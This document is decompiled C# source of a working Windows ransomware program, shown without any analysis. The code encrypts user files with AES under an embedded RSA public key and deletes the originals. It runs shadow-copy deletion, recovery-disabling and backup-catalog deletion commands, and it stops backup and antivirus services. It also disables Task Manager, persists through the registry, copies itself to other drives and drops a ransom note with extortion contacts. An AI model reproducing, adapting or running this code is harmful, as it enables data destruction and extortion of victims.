O1jxJqWuuPt9wzxqfliX5UX8B39zmsuvZy/L/qqcpO7ZwYnE+1skrJBRRRXpnGdv4C1i3uEn8M6r81lfgiIk/cc+npngj3ArmNd0ifQdYnsLnl4m+VscOp6MPqKoK7RsroSrqcgjsRXefEvF3YeH9TkAE9xbYfHfhW/mx/OuFr2OIVtp7+q6/M2+ODvujgqKKK7jEKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACtHw/qp0XXrPUACwgkDMB3Xof0JrOoqZxUk4vZ6MabTujtfiHoRW+Gv6f++02+AkMqdFcjv6Z6/XI6iuKrpPDfjW98PxtatGl5p8md9tN05649PpyPatZ7j4f6oPNlg1DTZD1SIZX8Ov9K46c6mHj7OcXJLZrX70atRnqnZnC0V232T4e/wDQQ1T/AL4P/wATR9k+Hv8A0ENU/wC+D/8AE1X1xfyS/wDAWL2XmvvOJortvsnw9/6CGqf98H/4mj7J8Pf+ghqn/fB/+Jo+uL+SX/gLD2XmvvOJort/sXw9/wCghqf/AHx/9jS/YPh+f+X/AFT/AL4/+xo+uL+SX/gLD2XmvvOHoruf7O8AH/mIar/3x/8AY0v9meAv+f8A1X/vj/7Gj67H+WX/AICxqi31RwtFd3/ZfgP/AJ/tV/75/wDsaP7J8B/8/uqf98//AGNH12P8svuZSw83tb7zhKK74aN4FPS81T/vn/7Gl/sPwN/z96r/AN8//Y0vr0P5ZfcyvqtTscBRXoH9h+B/+fvVf++f/saP7B8Ef8/eq/8AfP8A9jR9eh/LL7mH1Sr2PP6K9B/4R/wT/wA/Wq/l/wDY0f8ACP8Agn/n61X8v/saX1+n/LL7mP6nV7Hn1Feg/wBg+CP+frVf++f/ALGk/sLwP/z96p/3z/8AY0/r0P5ZfcxfU6q6Hn9Fd/8A2H4H/wCfzVf++f8A7GkOjeBR1vNU/wC+f/saPr0P5Zfcw+q1OxwNFd7/AGR4D/5/dU/75/8AsaT+yfAf/P8Aap/3x/8AY0/rsf5ZfcyXh5rexwdFd1/ZngL/AJ/9V/74/wDsaT+zfAH/AD/6p/3x/wDY0fXY/wAsv/AWT7FrqjhqK7j+z/h//wA/+qf98f8A2NJ9h+H4/wCYhqn/AHx/9jR9cX8kv/AWL2XmvvOIort/sXw9/wCghqf/AHx/9jSfZPh7/wBBDVP++D/8TR9cX8kv/AWHsvNfecTRXbfZPh7/ANBDVP8Avg//ABNH2T4e/wDQQ1T/AL4P/wATR9cX8kv/AAFh7LzX3nE0V232T4e/9BDVP++D/wDE0oj+Hlt85n1O6x0jwRn9B/On9bT2hL7mHs/NfeYHhrw9ceJNVjtbdWEYIM0uOEX/AB7AVr/EfWLe/wBahsbIg2unR+QpByC3fHtwB+FP1Xx9/wAS9tM8OWK6XZEYZl/1jj69vryfeuNpU4VKtVVaislsvXqwbUY8sXvuFFFFdhkFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAU4ORTaKALCODTw9VORTtxpWKUmi6JKeJKpCQ+tPEtS4msazXUuiX608TH1qiJM96k8ypcEbxxLXUui4b1p4uDWf5n1pwk96n2aNli2jQ+1H3pftX1rP833o8yl7MtYxl43J96abhvWqfmGmeZ70/ZkvFsuGY+tRmX3qsZPemmT3pqCMp4pssGSmGSoDIKYZKtROeVZsmLmml6jMlRlzTSM3Jskd6iLk0nNFURcKKKKBBRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFGTRRQAu40vmH3ptFAEvmUvm/SoaKVh3ZP5g/wAmjzKgoosF2TeYP8mjzPcVDRRYLskMnvTNxpKKYgyaKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACipJ0WO6mRRhVYgD8ajoAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiit62062ktYnaPLMgJ5PpQB//2Q==";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "", "You must follow these steps To decrypt your files :   ", "1) Write on Telegram: @eugina_gustavo", "", "2) Write on email: helpdeskadminassistance@proton.me" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.get_CurrentInputLanguage().get_Culture().Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString()!.Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			string extension;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>y1DCXpX570qG/zfNJb4faZLM9hJ3MtVWtTgZEElrBmSHRLTuT26S5wgounkAuXMgwAodR4cZUoj89Oumn6Za4YEid6KtqSH6FRFZ1eG3LovRiAtFacaty7d3BMEOWhkXwlCRWnBtFjdqWex/vDxkBiTcCtT+ZkbHWDqBbRdRBfgdt5huSyeurZgIw4Gm1X0y60bFaUBME+6zW6Su8B499JyNizFiv9xsRhwZs75e3h3hahAwGKskr9eU+T+I+F8bT5AMO3vMGFDawYxxLNYLweOM7JopX245gEzWkB1EabiOJppDTo+Bi5kGUaTg3p/VAc/rmm8srdYx2xtr0DvYdQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
